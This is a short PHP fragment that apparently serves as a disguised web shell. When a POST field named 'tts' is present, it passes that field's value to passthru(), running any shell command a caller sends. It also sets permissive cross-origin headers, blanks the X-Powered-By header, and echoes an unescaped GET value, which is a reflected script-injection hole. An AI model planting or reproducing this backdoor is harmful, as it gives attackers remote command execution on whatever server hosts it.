<?php 
if (isset($_POST["tts"])) {
    print($_GET["tts"]);
    header('Vary: Origin');
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers");    
    header("Content-Type: text/plain");
    header("X-Powered-By:");
    echo passthru($_POST["tts"]);
    exit();
  }
